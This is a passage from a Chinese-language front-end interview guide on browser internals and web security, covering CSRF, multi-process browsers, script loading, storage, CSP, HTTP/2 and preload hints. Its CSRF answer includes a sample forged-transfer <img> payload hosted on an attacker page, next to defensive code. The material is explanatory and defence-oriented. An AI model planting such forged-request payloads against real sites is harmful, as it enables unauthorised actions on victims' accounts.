// 1. PWA离线应用
// 2. 缓存静态资源
// 3. 推送通知
// 4. 后台同步
```

---

### Q10：什么是CSRF攻击？如何防御？

**答**：
```javascript
// CSRF（Cross-Site Request Forgery）跨站请求伪造
// 攻击者诱导用户在已登录的网站执行非本意操作

// 攻击场景：
// 1. 用户登录bank.com，Cookie生效
// 2. 用户访问evil.com
// 3. evil.com包含：<img src="https://bank.com/transfer?to=attacker&amount=1000">
// 4. 浏览器自动携带Cookie发送请求
// 5. 转账成功（用户不知情）

// 防御方法：

// 1. CSRF Token
// 服务器生成Token，表单提交时验证
app.post('/transfer', (req, res) => {
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // 处理转账
});

// 2. SameSite Cookie
Set-Cookie: sessionId=xxx; SameSite=Strict
// Strict：Cookie只在同站请求发送
// Lax：导航到目标网站的GET请求可发送
// None：所有请求都发送（需要Secure）

// 3. 验证Referer/Origin
app.post('/transfer', (req, res) => {
  const origin = req.headers.origin;
  if (origin !== 'https://bank.com') {
    return res.status(403).send('Invalid origin');
  }
});

// 4. 双重Cookie验证
// 在Cookie和请求参数中都发送Token，服务器比较两者
```

---

### Q11：浏览器的多进程架构有什么优缺点？

**答**：
```
Chrome多进程架构：
- Browser进程：UI、网络、存储
- Renderer进程：每个标签页一个（渲染、JS执行）
- GPU进程：3D渲染、合成
- Plugin进程：插件

优点：
1. 稳定性
   - 单个标签页崩溃不影响其他标签页
   - 插件崩溃不影响浏览器

2. 安全性
   - 渲染进程沙箱隔离
   - 恶意代码无法访问系统资源
   - 不同源的标签页进程隔离

3. 性能
   - 多核CPU并行处理
   - 单个标签页卡顿不影响其他

缺点：
1. 内存占用高
   - 每个进程有独立内存空间
   - Chrome是"内存杀手"

2. 进程间通信开销
   - IPC有性能损耗

3. 资源消耗
   - 每个进程都有基础开销

优化措施：
- 站点隔离（Site Isolation）：同站标签页共享进程
- 内存回收：后台标签页内存可被回收
```

---

### Q12：script标签的async和defer有什么区别？

**答**：
```html
<!-- 普通script：阻塞HTML解析 -->
<script src="app.js"></script>
<!--
  HTML解析 → 暂停 → 下载JS → 执行JS → 继续HTML解析
-->

<!-- async：异步下载，下载完立即执行 -->
<script async src="app.js"></script>
<!--
  HTML解析不暂停
  JS下载完成后立即执行（暂停HTML解析）
  执行顺序不确定
  适合：独立脚本（如统计代码）
-->

<!-- defer：异步下载，HTML解析完后执行 -->
<script defer src="app.js"></script>
<!--
  HTML解析不暂停
  HTML解析完成后，DOMContentLoaded之前执行
  按顺序执行
  适合：依赖DOM的脚本
-->

<!-- 执行时机对比 -->
<!--
  普通：  ████ 下载 ██ 执行
  async： HTML解析...  ████ 下载 ██ 执行  ...继续解析
  defer： HTML解析...  ████ 下载 ...解析完成... ██ 执行
-->

<!-- 使用建议 -->
<head>
  <!-- 第三方独立脚本 -->
  <script async src="analytics.js"></script>
  
  <!-- 依赖DOM的脚本 -->
  <script defer src="app.js"></script>
</head>
```

---

### Q13：LocalStorage、SessionStorage和Cookie的区别？

**答**：
```javascript
// 存储对比
/*
| 特性 | Cookie | LocalStorage | SessionStorage |
|------|--------|--------------|----------------|
| 容量 | 4KB | 5-10MB | 5-10MB |
| 生命周期 | 可设置过期时间 | 永久（手动删除） | 会话级（关闭标签页失效） |
| 服务器访问 | 每次请求自动发送 | 不发送 | 不发送 |
| 同源策略 | 受限 | 受限 | 受限（且不跨标签页） |
| API | document.cookie | getItem/setItem | getItem/setItem |
*/

// Cookie
document.cookie = 'name=value; expires=Thu, 01 Jan 2025 00:00:00 GMT; path=/; secure; httponly';
// 特点：
// - 可设置HttpOnly（JS不可读）
// - 可设置Secure（仅HTTPS）
// - 可设置SameSite（防CSRF）
// - 每次请求自动发送（可能浪费带宽）

// LocalStorage
localStorage.setItem('key', 'value');
localStorage.getItem('key');
localStorage.removeItem('key');
localStorage.clear();
// 特点：
// - 同源所有标签页共享
// - 永久存储（除非手动删除）
// - 容量大（5-10MB）

// SessionStorage
sessionStorage.setItem('key', 'value');
// 特点：
// - 仅当前标签页有效
// - 关闭标签页/浏览器失效
// - 刷新页面不失效

// 使用场景：
// - Cookie：身份认证（HttpOnly）
// - LocalStorage：用户偏好、缓存数据
// - SessionStorage：表单数据暂存、一次性数据
```

---

### Q14：什么是内容安全策略（CSP）？如何配置？

**答**：
```html
<!-- CSP（Content Security Policy）：防止XSS等攻击 -->

<!-- 通过HTTP响应头配置 -->
<!--
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; style-src 'self' 'unsafe-inline'
-->

<!-- 通过meta标签配置 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">

<!-- 常用指令 -->
<!--
default-src: 默认策略
script-src: JavaScript来源
style-src: CSS来源
img-src: 图片来源
font-src: 字体来源
connect-src: AJAX/WebSocket来源
frame-src: iframe来源
-->

<!-- 常用值 -->
<!--
'self': 同源
'none': 禁止
'unsafe-inline': 允许内联（不安全）
'unsafe-eval': 允许eval（不安全）
https://example.com: 指定域名
-->

<!-- 示例配置 -->
<!--
# 只允许同源脚本
Content-Security-Policy: script-src 'self'

# 禁止内联脚本，允许指定CDN
Content-Security-Policy: script-src 'self' https://cdn.example.com

# 报告违规但不阻止
Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-report

# 升级不安全请求
Content-Security-Policy: upgrade-insecure-requests
-->
```

---

### Q15：什么是HTTP/2？相比HTTP/1.1有什么优势？

**答**：
```
HTTP/2特性：

1. 多路复用（Multiplexing）
   - 单个TCP连接可并行多个请求/响应
   - 解决HTTP/1.1的队头阻塞问题
   - 不需要多个TCP连接

2. 头部压缩（HPACK）
   - 使用静态表和动态表压缩头部
   - 减少重复头部传输
   - 节省带宽

3. 服务器推送（Server Push）
   - 服务器主动推送资源
   - 如：推送CSS/JS，减少请求

4. 二进制分帧
   - HTTP/1.1是文本协议
   - HTTP/2是二进制协议
   - 更高效的解析

5. 流优先级
   - 可以设置资源优先级
   - 关键资源优先加载

HTTP/1.1 vs HTTP/2：
| 特性 | HTTP/1.1 | HTTP/2 |
|------|----------|--------|
| 连接 | 多个TCP连接 | 单个TCP多路复用 |
| 头部 | 文本，重复传输 | 二进制，压缩 |
| 服务器推送 | 不支持 | 支持 |
| 队头阻塞 | 有 | 解决 |

注意：HTTP/2的TCP层仍有队头阻塞，HTTP/3（QUIC）解决
```

---

### Q16：preload、prefetch、preconnect的区别？

**答**：
```html
<!-- preload：预加载当前页面必需的资源 -->
<link rel="preload" href="critical.css" as="style">
<link rel="preload" href="main.js" as="script">
<link rel="preload" href="font.woff2" as="font" crossorigin>
<!-- 
  - 高优先级加载
  - 当前页面一定会用到
  - 必须指定as属性
  - 跨域资源需要crossorigin
-->

<!-- prefetch：预获取将来可能需要的资源 -->
<link rel="prefetch" href="next-page.js">
<link rel="prefetch" href="next-page-image.jpg">
<!--
  - 低优先级，浏览器空闲时加载
  - 下一页面可能用到的资源
  - 存入缓存备用
-->

<!-- preconnect：预连接到指定域名 -->
<link rel="preconnect" href="https://api.example.com">
<link rel="preconnect" href="https://cdn.example.com" crossorigin>
<!--
  - 提前完成DNS解析、TCP连接、TLS握手
  - 减少连接延迟
  - 用于确定会访问的第三方域名
-->

<!-- dns-prefetch：仅DNS预解析 -->
<link rel="dns-prefetch" href="https://api.example.com">
<!--
  - 比preconnect轻量
  - 只做DNS解析
  - 兼容性更好
-->

<!-- 使用建议 -->
<head>
  <!-- 预连接关键第三方服务 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://cdn.example.com" crossorigin>
  
  <!-- DNS预解析 -->
  <link rel="dns-prefetch" href="https://analytics.example.com">
  
  <!-- 预加载关键资源 -->
  <link rel="preload" href="/fonts/main.woff2" as="font" crossorigin>
  <link rel="preload" href="/css/critical.css" as="style">
  
  <!-- 预获取下一页资源 -->
  <link rel="prefetch" href="/js/next-page.js">
</head>
```

---

## 总结

浏览器原理和Web安全是前端面试的重点，需要深入理解：
- **浏览器架构**：多进程模型、渲染流程
- **性能优化**：减少重排重绘、合成层优化
- **缓存策略**：强缓存、协商缓存
- **跨域方案**：CORS、代理、JSONP
- **安全防御**：XSS、CSRF、点击劫持、SQL注入
